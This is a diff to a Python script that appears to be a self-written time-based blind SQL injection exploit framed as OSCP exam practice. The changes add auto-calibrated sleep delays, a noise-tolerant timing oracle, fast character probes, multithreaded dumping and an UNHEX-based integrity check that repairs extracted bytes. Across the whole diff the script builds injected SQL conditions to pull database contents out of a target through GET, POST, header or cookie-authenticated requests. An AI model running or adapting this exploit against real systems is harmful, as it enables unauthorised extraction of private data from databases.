@@ -4,14 +4,6 @@
 # Oracle = RESPONSE TIME. A condition is wrapped so the DB sleeps when TRUE:
 # slow reply (>= threshold) = TRUE, instant reply = FALSE.
 #
-# Robustness: instead of one hardcoded SLEEP wrapper, the script tries several
-# wrapper forms at startup and locks in the first that passes the 1=1/1=2
-# check - so SELECT, INSERT/header, and filtered contexts all just work.
-#
-# Speed: the per-character binary search is sequential, but characters are
-# independent, so after finding the length each position is dumped in its own
-# thread. Real speedup ~= thread count.
-#
 # Methods: GET (query string), POST (body), HEADER (e.g. X-Forwarded-For).
 # Optional session cookie for endpoints that require an authenticated session.
 # Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
@@ -45,10 +37,20 @@ TEMPLATE     = input("Payload template (use [INJECT] as placeholder): ").strip()
 COOKIE_NAME  = input("Cookie name (Enter for default 'token')      : ").strip() or "token"
 COOKIE_VALUE = input("Session cookie value (blank = no cookie)     : ").strip()
 
-DELAY        = int(input("SLEEP seconds on TRUE (e.g. 3)               : ").strip() or "3")
+# Auto mode samples the target and derives DELAY from the measured jitter.
+# Enter a number instead to force a fixed value - use that when the box is
+# unstable enough that the sampling itself is unreliable.
+_delay_in    = input("SLEEP seconds on TRUE (y = auto, or a number): ").strip().lower()
+AUTO_DELAY   = _delay_in in ("", "y", "yes", "auto", "a")
+DELAY        = None if AUTO_DELAY else float(_delay_in)
 THREADS      = int(input("Threads (e.g. 8; lower if box is fragile)    : ").strip() or "8")
-# A reply this slow (or slower) counts as TRUE. Below DELAY to absorb jitter.
-THRESHOLD    = DELAY * 0.7
+
+# Filled in by calibrate_timing(). THRESHOLD splits TRUE from FALSE; the gray
+# band around it marks readings too close to call, which get re-measured.
+THRESHOLD    = None
+GRAY_LO      = None
+GRAY_HI      = None
+BASE_P95     = None
 
 # One session reused for every request (across all threads). The cookie (if
 # set) rides along automatically in the Cookie header on each request.
@@ -93,9 +95,54 @@ def timed(cond, wrapper):
     send(build(cond, wrapper))
     return time.time() - start
 
+# --- Timing calibration: measure the noise floor, then size DELAY to it -----
+# Samples are taken at the real THREADS concurrency, because a box that is
+# calm single-threaded can be much noisier once the pool is hammering it.
+# The no-op payload splices 0 in place of [INJECT], so it is valid in every
+# context and never sleeps - it measures pure round-trip time.
+def sample_baseline(n):
+    payload = TEMPLATE.replace("[INJECT]", "0")
+    def one(_):
+        start = time.time()
+        try:
+            send(payload)
+        except Exception:
+            return None
+        return time.time() - start
+    samples = []
+    with ThreadPoolExecutor(max_workers=THREADS) as ex:
+        for r in ex.map(one, range(n)):
+            if r is not None:
+                samples.append(r)
+    return sorted(samples)
+
+def calibrate_timing():
+    global DELAY, THRESHOLD, GRAY_LO, GRAY_HI, BASE_P95
+    n = max(12, THREADS * 2)
+    print(f"\n[*] Sampling baseline RTT ({n} requests at {THREADS} threads)...")
+    s = sample_baseline(n)
+    if len(s) < 4:
+        print("[!] Baseline sampling failed (target unreachable?). Aborting.")
+        sys.exit(1)
+    med = s[len(s) // 2]
+    p95 = s[min(len(s) - 1, int(len(s) * 0.95))]
+    # Jitter is the spread above the median, floored so a suspiciously quiet
+    # sample run cannot collapse DELAY to something unusable.
+    jitter = max(p95 - med, 0.05)
+    if AUTO_DELAY:
+        DELAY = round(max(0.5, 4 * jitter), 2)
+    # A TRUE lands near p95 + DELAY, a FALSE at or below p95. Split the gap.
+    BASE_P95  = p95
+    THRESHOLD = p95 + DELAY * 0.5
+    GRAY_LO   = p95 + DELAY * 0.3
+    GRAY_HI   = p95 + DELAY * 0.7
+    print(f"[+] baseline: median {med:.3f}s  p95 {p95:.3f}s  jitter {jitter:.3f}s")
+    print(f"[+] DELAY {DELAY:.2f}s ({'auto' if AUTO_DELAY else 'manual'})  "
+          f"threshold {THRESHOLD:.3f}s  gray band {GRAY_LO:.3f}-{GRAY_HI:.3f}s")
+
 # --- Calibration: pick the wrapper that actually delays --------------------
 CHOSEN = None
-def calibrate():
+def calibrate_wrapper():
     global CHOSEN
     for w in WRAPPERS:
         try:
@@ -108,16 +155,30 @@ def calibrate():
             return w
     return None
 
+calibrate_timing()
+
+# If the auto DELAY sits too close to the noise, the wrapper check fails even
+# on a perfectly injectable parameter. Back off and retry before giving up.
 print("\n[*] Calibrating wrapper (sends a few DELAY-second requests)...")
-if not calibrate():
+for attempt in range(3):
+    if calibrate_wrapper():
+        break
+    if attempt < 2 and AUTO_DELAY:
+        DELAY = round(DELAY * 2, 2)
+        THRESHOLD = BASE_P95 + DELAY * 0.5
+        GRAY_LO   = BASE_P95 + DELAY * 0.3
+        GRAY_HI   = BASE_P95 + DELAY * 0.7
+        print(f"[*] No wrapper fired - raising DELAY to {DELAY:.2f}s and retrying...")
+if not CHOSEN:
     print("[!] No wrapper fired. TRUE never delayed or FALSE also delayed.")
     print("    - Check the template breaks out of the query correctly.")
     print("    - HEADER values must use real spaces, never + or %20.")
     print("    - If the endpoint needs auth, check the cookie name/value.")
     print("    - The parameter may simply not be injectable here.")
+    print("    - If the box is heavily loaded, rerun and set DELAY manually.")
     print(f"    method   = {METHOD}")
     print(f"    template = {TEMPLATE!r}")
-    print(f"    delay    = {DELAY}s, threshold = {THRESHOLD}s")
+    print(f"    delay    = {DELAY}s, threshold = {THRESHOLD:.3f}s")
     print(f"    cookie   = {COOKIE_NAME}={'(set)' if COOKIE_VALUE else '(none)'}")
     sys.exit(1)
 print(f"[+] Using wrapper: {CHOSEN}\n")
@@ -126,22 +187,54 @@ print(f"[+] Using wrapper: {CHOSEN}\n")
 SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]
 
 # --- Core oracle + extraction ----------------------------------------------
-def oracle(condition):
-    """One boolean question -> True if the reply was delayed."""
-    start = time.time()
-    send(build(condition, CHOSEN))
-    return (time.time() - start) >= THRESHOLD
+def oracle(condition, tries=3):
+    """One boolean question -> True if the reply was delayed.
+    A reading outside the gray band is decisive and returns immediately.
+    Anything inside it is noise, so re-measure and take the majority."""
+    votes = 0
+    seen = 0
+    for _ in range(tries):
+        start = time.time()
+        send(build(condition, CHOSEN))
+        elapsed = time.time() - start
+        if elapsed >= GRAY_HI:
+            return True
+        if elapsed <= GRAY_LO:
+            return False
+        seen += 1
+        if elapsed >= THRESHOLD:
+            votes += 1
+    return votes * 2 > seen
 
-def extract_char(subquery, pos):
-    """Binary search the byte value (0-255) of the char at position pos."""
-    lo, hi = 0, 255
+# Cheap probes run before any binary search. FALSE costs one RTT, TRUE costs a
+# full DELAY, so each probe is phrased so the likely answer is FALSE - except
+# the comma, which is worth one direct hit because group_concat output is full
+# of them and it resolves the byte in a single question.
+FAST_SINGLES = [44]                          # ,
+FAST_RANGES  = [(97, 122), (48, 57), (65, 90)]   # a-z, 0-9, A-Z
+
+def bsearch(expr, lo, hi):
+    """Binary search a byte value inside an inclusive range."""
     while lo < hi:
         mid = (lo + hi) // 2
-        if oracle(f"ascii(substring(({subquery}),{pos},1))>{mid}"):
+        if oracle(f"{expr}>{mid}"):
             lo = mid + 1
         else:
             hi = mid
     return lo
+
+def extract_char(subquery, pos):
+    """Resolve the byte at position pos, narrowing with cheap probes first.
+    A lowercase byte costs one FALSE plus a 26-value search (~2.5 sleeps)
+    instead of a full 0-255 search (~4 sleeps)."""
+    expr = f"ascii(substring(({subquery}),{pos},1))"
+    for v in FAST_SINGLES:
+        if oracle(f"{expr}={v}"):
+            return v
+    for lo, hi in FAST_RANGES:
+        if not oracle(f"{expr} NOT BETWEEN {lo} AND {hi}"):
+            return bsearch(expr, lo, hi)
+    return bsearch(expr, 0, 255)
 
 def get_length(subquery):
     """Binary search the length of the result (so threads know how many chars)."""
@@ -154,20 +247,48 @@ def get_length(subquery):
             hi = mid
     return lo
 
+# --- Integrity check + repair ----------------------------------------------
+# One question confirms a whole segment, so a bad byte anywhere is caught for
+# the price of a single sleep. UNHEX keeps quotes out of the payload entirely,
+# and BINARY forces a byte-exact compare regardless of collation.
+def segment_ok(subquery, buf, lo, hi):
+    h = bytes(buf[lo:hi]).hex()
+    return oracle(f"BINARY(substring(({subquery}),{lo+1},{hi-lo}))=UNHEX('{h}')")
+
+def _fix(subquery, buf, lo, hi):
+    if segment_ok(subquery, buf, lo, hi):
+        return 0
+    if hi - lo == 1:
+        buf[lo] = bsearch(f"ascii(substring(({subquery}),{lo+1},1))", 0, 255)
+        return 1
+    mid = (lo + hi) // 2
+    return _fix(subquery, buf, lo, mid) + _fix(subquery, buf, mid, hi)
+
+def repair(subquery, buf):
+    """Verify the dump against the DB; bisect to any bad byte and re-read it.
+    Returns (ok, number_of_bytes_fixed)."""
+    fixed = 0
+    for _ in range(3):
+        if segment_ok(subquery, buf, 0, len(buf)):
+            return True, fixed
+        fixed += _fix(subquery, buf, 0, len(buf))
+    return segment_ok(subquery, buf, 0, len(buf)), fixed
+
 _print_lock = threading.Lock()
 def extract_string(subquery, label=None):
     """Find the length, then dump every character position in parallel.
-    Threads make time-based practical; order is restored by index."""
+    Threads make time-based practical; order is restored by index. Bytes are
+    kept as ints so a failed read can never shorten the buffer and shift
+    everything after it - the old silent-drop failure mode."""
     n = get_length(subquery)
     if n == 0:
         if label is not None:
             sys.stdout.write(f"{label}\n")
         return ""
-    result = [""] * n
+    buf = [0] * n
     done = 0
     def work(i):
-        v = extract_char(subquery, i + 1)
-        result[i] = chr(v) if v else ""
+        buf[i] = extract_char(subquery, i + 1)
     with ThreadPoolExecutor(max_workers=THREADS) as ex:
         futures = {ex.submit(work, i): i for i in range(n)}
         for _ in as_completed(futures):
@@ -176,9 +297,15 @@ def extract_string(subquery, label=None):
                 with _print_lock:
                     sys.stdout.write(f"\r{label}{done}/{n} chars")
                     sys.stdout.flush()
-    s = "".join(result)
+    ok, fixed = repair(subquery, buf)
+    s = bytes(buf).decode("utf-8", "replace")
     if label is not None:
-        sys.stdout.write(f"\r{label}{s}{' ' * 8}\n")
+        note = ""
+        if fixed:
+            note = f"  [repaired {fixed}]"
+        if not ok:
+            note += "  [UNVERIFIED]"
+        sys.stdout.write(f"\r{label}{s}{note}{' ' * 8}\n")
     return s
 
 # --- ASCII table renderer --------------------------------------------------
